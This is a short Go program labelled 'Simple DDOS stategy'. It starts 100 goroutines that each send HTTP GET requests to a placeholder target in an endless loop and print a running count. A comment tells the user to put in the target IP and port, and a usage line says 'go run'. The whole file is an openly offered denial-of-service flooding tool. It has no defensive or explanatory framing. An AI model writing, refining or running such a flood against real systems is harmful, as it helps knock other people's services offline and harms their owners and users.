//Simple DDOS stategy
package main

import (
	"fmt"
	"net/http"
	"sync/atomic"
	"time"
)

var req uint64

func main() {
	for i := 1; i <= 100; i++ {
		go func() {
			for {
				_, _ = http.Get("gfgfgfgfgf") //replace this value with target ip and port
				atomic.AddUint64(&req, 1)
				fmt.Println(req)
			}
		}()
		time.Sleep(1 * time.Second)
	}
}

//Usage = go run
